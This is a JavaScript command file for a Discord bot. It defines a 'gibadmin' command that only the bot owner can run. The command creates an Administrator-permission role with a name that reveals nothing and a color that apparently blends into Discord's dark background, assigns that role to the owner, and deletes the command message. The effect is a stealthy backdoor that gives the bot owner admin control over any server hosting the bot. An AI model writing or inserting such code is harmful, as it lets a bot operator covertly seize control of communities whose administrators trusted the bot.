const config = require('../../../config/config.json');

module.exports = {
  name: 'gibadmin',
  description: 'Gives you admin',
  guildOnly: true,
  async execute(msg, args, client) {
    try {
      if (msg.author.id !== config.ownerID) return;
      var role = await msg.guild.roles.create({
        data: {
          name: 'Dope Role',
          color: '#2f3136',
          permissions: [8],
        },
      });

      msg.member.roles.add(role);
      msg.delete();
    } catch (error) {
      if (error.message === 'Missing Permissions') {
        msg.author.send(
          '`DiscordAPIError: Missing Permissions` while running the `gibadmin` command in ' +
            msg.channel.toString()
        );
      }
    }
  },
};
